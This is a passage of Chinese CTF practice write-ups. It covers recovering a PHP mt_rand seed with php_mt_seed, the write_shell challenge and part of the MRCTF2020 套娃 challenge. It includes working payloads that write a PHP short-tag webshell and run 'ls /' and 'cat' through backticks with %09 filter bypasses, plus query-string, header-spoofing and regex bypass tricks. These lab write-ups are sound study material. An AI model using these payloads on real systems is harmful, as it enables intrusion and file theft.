class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;<br><span class="hljs-variable">$str</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$len1</span>=<span class="hljs-number">20</span>;<br><span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$len1</span>; <span class="hljs-variable">$i</span>++ )&#123;<br>    <span class="hljs-variable">$str</span>.=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$str_long1</span>, <span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>, <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str_long1</span>) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);       <br>&#125;<br><span class="hljs-variable">$str_show</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$str</span>, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.<span class="hljs-variable">$str_show</span>.<span class="hljs-string">&quot;&lt;/p&gt;&quot;</span>;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;num&#x27;</span>]===<span class="hljs-variable">$str</span>)&#123;x<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-string">&quot;check.php&quot;</span>);<br><br></code></pre></td></tr></table></figure><p>可以注意到我们猜测字符串是采用伪随机函数依据种子生成的，所以我们可以利用脚本通过给出的部分字符串逆推出伪随机函数采用的种子（这里脚本采用的是php_mt_seed）。</p><p>先使用PHP编写程序把给出的部分字符串处理成脚本需要的数据格式，php_mt_seed工具需要我们提供随机数前十位，这里正好十位，所以我们用脚本转10进制，程序源码如下：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs stylus">str1 =<span class="hljs-string">&#x27;RjLPc2jmUg&#x27;</span><br>str2 = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span><br>result =<span class="hljs-string">&#x27;&#x27;</span><br><br><br>length = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(str2)-<span class="hljs-number">1</span>)<br><span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(str1)):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(str2)):<br>        <span class="hljs-keyword">if</span> str1<span class="hljs-selector-attr">[i]</span> ==  str2<span class="hljs-selector-attr">[j]</span>:<br>            result += <span class="hljs-built_in">str</span>(j) + <span class="hljs-string">&#x27; &#x27;</span> +<span class="hljs-built_in">str</span>(j) + <span class="hljs-string">&#x27; &#x27;</span> + <span class="hljs-string">&#x27;0&#x27;</span> + <span class="hljs-string">&#x27; &#x27;</span> + length + <span class="hljs-string">&#x27; &#x27;</span><br>            break<br><br><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(result)</span></span><br><br></code></pre></td></tr></table></figure><p>php脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$str_long1</span> = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;<br><span class="hljs-variable">$string</span>=<span class="hljs-string">&#x27;RjLPc2jmUg&#x27;</span>;<br><span class="hljs-variable">$len1</span>=<span class="hljs-number">20</span>;<br><span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$len1</span>; <span class="hljs-variable">$i</span>++ )&#123;<br><span class="hljs-variable">$pos</span>=<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$str_long1</span>,<span class="hljs-variable">$string</span>[<span class="hljs-variable">$i</span>]);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$pos</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$pos</span>.<span class="hljs-string">&quot; 0 61 &quot;</span> ;  <br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>结果</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">53</span> <span class="hljs-number">53</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">9</span> <span class="hljs-number">9</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">47</span> <span class="hljs-number">47</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">51</span> <span class="hljs-number">51</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">2</span> <span class="hljs-number">2</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">28</span> <span class="hljs-number">28</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">9</span> <span class="hljs-number">9</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">12</span> <span class="hljs-number">12</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">56</span> <span class="hljs-number">56</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">6</span> <span class="hljs-number">6</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span><br></code></pre></td></tr></table></figure><p>使用php_mt_seed工具</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tap">./php_mt_seed<span class="hljs-number"> 53 </span>53<span class="hljs-number"> 0 </span>61<span class="hljs-number"> 9 </span>9<span class="hljs-number"> 0 </span>61<span class="hljs-number"> 47 </span>47<span class="hljs-number"> 0 </span>61<span class="hljs-number"> 51 </span>51<span class="hljs-number"> 0 </span>61<span class="hljs-number"> 2 </span>2<span class="hljs-number"> 0 </span>61<span class="hljs-number"> 28 </span>28<span class="hljs-number"> 0 </span>61<span class="hljs-number"> 9 </span>9<span class="hljs-number"> 0 </span>61<span class="hljs-number"> 12 </span>12<span class="hljs-number"> 0 </span>61<span class="hljs-number"> 56 </span>56<span class="hljs-number"> 0 </span>61<span class="hljs-number"> 6 </span>6<span class="hljs-number"> 0 </span>61<br></code></pre></td></tr></table></figure><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">得到种子为<span class="hljs-number">856151724</span><br></code></pre></td></tr></table></figure><p>放入php中执行代码，模拟源码得到完整字符串</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-number">856151724</span>);<br><span class="hljs-variable">$str_long1</span> = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;<br><span class="hljs-variable">$str</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$len1</span>=<span class="hljs-number">20</span>;<br><span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$len1</span>; <span class="hljs-variable">$i</span>++ )&#123;<br>    <span class="hljs-variable">$str</span>.=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$str_long1</span>, <span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>, <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str_long1</span>) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);       <br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.<span class="hljs-variable">$str</span>.<span class="hljs-string">&quot;&lt;/p&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span> <br><br></code></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">得到完整字符串为RjLPc2jmUgtGjKtpixK4<br></code></pre></td></tr></table></figure><p>拿到flag</p>]]></content>
      
      
      
        <tags>
            
            <tag> 刷题笔记 </tag>
            
            <tag> mt_srand伪随机数漏洞 </tag>
            
            <tag> php_mt_seed工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>红明谷CTF2021-write_shell</title>
      <link href="/2025/04/01/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF2021-write-shell/"/>
      <url>/2025/04/01/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF2021-write-shell/</url>
      
        <content type="html"><![CDATA[<h1 id="红明谷CTF2021-write-shell"><a href="#红明谷CTF2021-write-shell" class="headerlink" title="红明谷CTF2021-write_shell"></a>红明谷CTF2021-write_shell</h1><p>代码审计</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$input</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/&#x27;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;</span>,<span class="hljs-variable">$input</span>))&#123;<br>        <span class="hljs-comment">// if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123;</span><br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!!!&#x27;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$input</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$input</span></span>)</span>&#123;<br>  <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$input</span>))&#123;<br>      <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$input</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$output</span>)&#123;<br>          <span class="hljs-variable">$input</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$output</span>);<br>      &#125;<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>      <span class="hljs-variable">$input</span> = <span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$input</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-variable">$dir</span> = <span class="hljs-string">&#x27;sandbox/&#x27;</span> . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="hljs-string">&#x27;/&#x27;</span>;<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$dir</span>))&#123;<br>    <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$dir</span>);<br>&#125;<br><span class="hljs-keyword">switch</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;action&quot;</span>] ?? <span class="hljs-string">&quot;&quot;</span>) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;pwd&#x27;</span>:<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$dir</span>;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;upload&#x27;</span>:<br>        <span class="hljs-variable">$data</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;data&quot;</span>] ?? <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$data</span>);<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$dir</span>&quot;</span> . <span class="hljs-string">&quot;index.php&quot;</span>, <span class="hljs-variable">$data</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>传入两个参数</p><p>action&#x3D;pwd时，显示路径</p><p>action&#x3D;upload时，写入内容</p><hr><p><strong>check()函数</strong></p><p>通过正则过滤</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">preg_match</span><span class="hljs-params">(<span class="hljs-string">&quot;/&#x27;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;</span>,<span class="hljs-variable">$input</span>)</span></span><br></code></pre></td></tr></table></figure><p>对php的过滤可以使用短标签：<code>&lt;?=代码?&gt;</code></p><p>对空格的过滤可使用 “&#x2F;t” 或 “%09”代替</p><p>没有过滤反引号，可以在反引号中执行shell命令</p><hr><p>首先查看我们文件生成的路径</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">action</span>=pwd<br><br><span class="hljs-comment">#sandbox/fc3f8d0d99ccdde85c8cfc624fe94c32/</span><br></code></pre></td></tr></table></figure><p>查看目录</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?a</span>ction=upload&amp;data=&lt;<span class="hljs-string">?=</span><span class="hljs-string">`ls\t/`</span><span class="hljs-string">?&gt;</span><br>或<br><span class="hljs-string">?a</span>ction=upload&amp;data=&lt;<span class="hljs-string">?=</span><span class="hljs-string">`ls%09/`</span><span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure><p>访问得到目录信息</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">url<span class="hljs-regexp">/sandbox/</span>fc3f8d0d99ccdde85c8cfc624fe94c32/index.php<br><br><span class="hljs-comment">#bin boot dev etc flllllll1112222222lag home lib lib64 media mnt opt proc root run sbin srv start.sh sys tmp usr var</span><br></code></pre></td></tr></table></figure><hr><p>读取文件</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?a</span>ction=upload&amp;data=&lt;<span class="hljs-string">?=</span><span class="hljs-string">`cat\t/flllllll1112222222lag`</span><span class="hljs-string">?&gt;</span><br>或<br><span class="hljs-string">?a</span>ction=upload&amp;data=&lt;<span class="hljs-string">?=</span><span class="hljs-string">`cat%09/flllllll1112222222lag`</span><span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure><p>访问得到flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sandbox/fc3f8d0d99ccdde85c8cfc624fe94c32/index.php<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 刷题笔记 </tag>
            
            <tag> 短标签绕过 </tag>
            
            <tag> shell写入 </tag>
            
            <tag> 空格过滤绕过 </tag>
            
            <tag> 反引号执行命令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MRCTF2020-套娃</title>
      <link href="/2025/03/31/MRCTF2020-%E5%A5%97%E5%A8%83/"/>
      <url>/2025/03/31/MRCTF2020-%E5%A5%97%E5%A8%83/</url>
      
        <content type="html"><![CDATA[<h1 id="MRCTF2020-套娃"><a href="#MRCTF2020-套娃" class="headerlink" title="MRCTF2020-套娃"></a>MRCTF2020-套娃</h1><p>打开页面</p><p><img src="/../image/MRCTF2020-%E5%A5%97%E5%A8%83-1.png"></p><p>没有有用的信息，查看下网页源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!--<br><span class="hljs-comment">//1st</span><br><span class="hljs-variable">$query</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>];<br><br> <span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">substr_count</span>(<span class="hljs-variable">$query</span>, <span class="hljs-string">&#x27;_&#x27;</span>) !== <span class="hljs-number">0</span> || <span class="hljs-title function_ invoke__">substr_count</span>(<span class="hljs-variable">$query</span>, <span class="hljs-string">&#x27;%5f&#x27;</span>) != <span class="hljs-number">0</span> )&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Y0u are So cutE!&#x27;</span>);<br>&#125;<br> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b_u_p_t&#x27;</span>] !== <span class="hljs-string">&#x27;23333&#x27;</span> &amp;&amp; <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^23333$/&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b_u_p_t&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you are going to the next ~&quot;</span>;<br>&#125;<br>!--&gt;<br><br></code></pre></td></tr></table></figure><p>代码审计，这里很明显要我们绕过两次if判断才能到下一步。</p><p><strong>首先第一个if判断，会通过substr_count函数统计_和%5f出现的次数，可以使用空格”%20”、”.”来代替下划线因为空格和.如果为传参的话会自动转换为下划线，而且因为这里计算的是”%5f”的次数，十六进制不区分大小写，也可以使用”%5F”去绕过</strong></p><hr><p><strong>第2个if的中要求内容不能是”23333”，但是执行匹配正则表达式，想到达下一关$_GET[‘b_u_p_t’]的值必须是23333%0a即换行符的url编码，在preg_match没启动&#x2F;s模式（单行匹配模式）时，正则表达式是无法匹配换行符(%0a,\n)的,且会自动忽略末尾的换行符</strong></p><p>所以传入</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gcode">?b.u.p.t=<span class="hljs-number">23333</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>a<br>或者<br>?b<span class="hljs-meta">%</span><span class="hljs-number">20</span>u<span class="hljs-meta">%</span><span class="hljs-number">20</span>p<span class="hljs-meta">%</span><span class="hljs-number">20</span>t=<span class="hljs-number">23333</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>a<br></code></pre></td></tr></table></figure><p><img src="/../image/MRCTF2020-%E5%A5%97%E5%A8%83-2.png"></p><p>提示我们访问secrettw.php</p><p><img src="/../image/MRCTF2020-%E5%A5%97%E5%A8%83-3.png"></p><p>F12查看元素</p><p>发现一大串js加密代码，放入控制台中执行</p><p><img src="/../image/MRCTF2020-%E5%A5%97%E5%A8%83-4.png"></p><p><img src="/../image/MRCTF2020-%E5%A5%97%E5%A8%83-5.png"></p><p>告诉我们POST传参Merak，POST传入Merak&#x3D;1</p><p>发现源码，继续审计</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">// 关闭错误报告</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;takeip.php&#x27;</span>; <span class="hljs-comment">// 引入一个文件，可能用于获取用户 IP 地址</span><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>); <span class="hljs-comment">// 限制 PHP 访问文件的目录为当前目录</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>; <span class="hljs-comment">// 引入一个包含标志或者敏感信息的文件</span><br> <br><span class="hljs-comment">// 检查是否有 POST 请求，并输出当前文件的代码</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Merak&#x27;</span>])) &#123;      <br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>); <span class="hljs-comment">// 高亮显示当前文件的代码</span><br>    <span class="hljs-keyword">die</span>(); <span class="hljs-comment">// 终止程序执行</span><br>&#125;<br> <br><span class="hljs-comment">// 自定义的 change 函数</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">change</span>(<span class="hljs-params"><span class="hljs-variable">$v</span></span>) </span>&#123;      <br>    <span class="hljs-variable">$v</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$v</span>); <span class="hljs-comment">// 首先对传入的参数进行 base64 解码</span><br>    <span class="hljs-variable">$re</span> = <span class="hljs-string">&#x27;&#x27;</span>; <span class="hljs-comment">// 初始化返还值</span><br>    <span class="hljs-comment">// 对解码后的字符串进行处理</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$v</span>); <span class="hljs-variable">$i</span>++) &#123;          <br>        <span class="hljs-variable">$re</span> .= <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$v</span>[<span class="hljs-variable">$i</span>]) + <span class="hljs-variable">$i</span> * <span class="hljs-number">2</span>); <span class="hljs-comment">// 每个字符的 ASCII 值加上位置的二倍</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$re</span>; <span class="hljs-comment">// 返回处理后的字符串</span><br>&#125;<br> <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Local access only!&#x27;</span> . <span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>; <span class="hljs-comment">// 输出提示信息</span><br> <br><span class="hljs-variable">$ip</span> = <span class="hljs-title function_ invoke__">getIp</span>(); <span class="hljs-comment">// 调用 getIp 方法获取用户的 IP 地址</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$ip</span> != <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sorry, you don&#x27;t have permission! Your ip is :&quot;</span> . <span class="hljs-variable">$ip</span>; <span class="hljs-comment">// 如果不是本地 IP，输出拒绝访问的信息</span><br>&#125;<br> <br><span class="hljs-comment">// 如果是本地 IP 并且 GET 请求中的 &#x27;2333&#x27; 参数所代表的文件内容为 &#x27;todat is a happy day&#x27;</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$ip</span> === <span class="hljs-string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;2333&#x27;</span>]) === <span class="hljs-string">&#x27;todat is a happy day&#x27;</span>) &#123;<br>    <span class="hljs-comment">// 输出请求的修改过的文件名，并且读取其内容</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Your REQUEST is:&quot;</span> . <span class="hljs-title function_ invoke__">change</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-title function_ invoke__">change</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])); <br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>看到127.0.0.1猜测是请求头绕过尝试X-Forwarder-For或client-ip头绕过</p><p>file_get_contents($_GET[‘2333’]) &#x3D;&#x3D;&#x3D; ‘todat is a happy day’ )可由data:\伪协议绕过</p><p>最后很明显要我们利用危险函数file_get_contents来得到flag，但是我们传入的file的值会先被加密</p><ul><li><code>file</code>: 是需要读取的文件（经过 <code>change</code> 函数编码后的路径）</li></ul><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs perl">function change(<span class="hljs-variable">$v</span>)&#123; <br>    <span class="hljs-variable">$v</span> = base64_decode(<span class="hljs-variable">$v</span>); <br>    <span class="hljs-variable">$re</span> = <span class="hljs-string">&#x27;&#x27;</span>; <br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;strlen(<span class="hljs-variable">$v</span>);<span class="hljs-variable">$i</span>++)&#123; <br>        <span class="hljs-variable">$re</span> .= <span class="hljs-keyword">chr</span> ( <span class="hljs-keyword">ord</span> (<span class="hljs-variable">$v</span>[<span class="hljs-variable">$i</span>]) + <span class="hljs-variable">$i</span>*<span class="hljs-number">2</span> ); <br>    &#125; <br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$re</span>; <br>&#125;<br></code></pre></td></tr></table></figure><p>所以这里需要我们逆推解密</p><p>python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 